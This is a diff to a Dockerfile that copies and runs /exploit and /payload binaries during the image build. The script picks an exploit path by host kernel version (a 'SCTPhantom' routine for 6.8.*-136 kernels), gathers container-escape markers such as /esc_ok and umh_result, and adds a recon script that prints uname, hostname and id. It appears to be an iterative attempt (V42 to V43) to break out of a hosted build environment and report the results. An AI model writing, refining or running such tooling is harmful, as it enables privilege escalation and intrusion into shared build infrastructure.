@@ -7,11 +7,11 @@ COPY payload /payload
 RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
     
    
-ARG CACHEBUST=465
+ARG CACHEBUST=470
 RUN sh -c '{ \
 echo "CB=$CACHEBUST"; \
 KVER=$(uname -r); \
-echo "=== BUILD V42 KERNEL=$KVER ==="; \
+echo "=== BUILD V43 KERNEL=$KVER ==="; \
 case "$KVER" in \
   6.8.*-136*) \
     echo "TARGET KERNEL 136 — SCTPhantom FIRST"; \
@@ -38,7 +38,7 @@ esac; \
 for f in /esc_ok /tmp/umh_result /tmp/.u68; do \
   if [ -f "$f" ]; then echo "=== $f ==="; cat "$f"; fi; \
 done; \
-echo "=== END V42 ==="; \
+echo "=== END V43 ==="; \
 } > /build_results.txt 2>&1'
 
 FROM alpine:3.19
@@ -50,14 +50,14 @@ COPY --from=er028455/df-frontend:v5 /socktest /socktest
 
 RUN printf '#!/bin/sh\n\
 {\n\
-echo "=== RUNTIME RECON V42 ==="\n\
+echo "=== RUNTIME RECON V43 ==="\n\
 uname -a; hostname; id\n\
 echo "--- BUILD-TIME RESULTS ---"\n\
 cat /build_results.txt\n\
 for f in /esc_ok /umh_result; do\n\
   if [ -s "$f" ]; then echo "=== $f ==="; cat "$f"; fi\n\
 done\n\
-echo "=== END V42 ==="\n\
+echo "=== END V43 ==="\n\
 } > /tmp/recon 2>&1\n\
 cat /tmp/recon\n\
 ' > /recon.sh && chmod +x /recon.sh
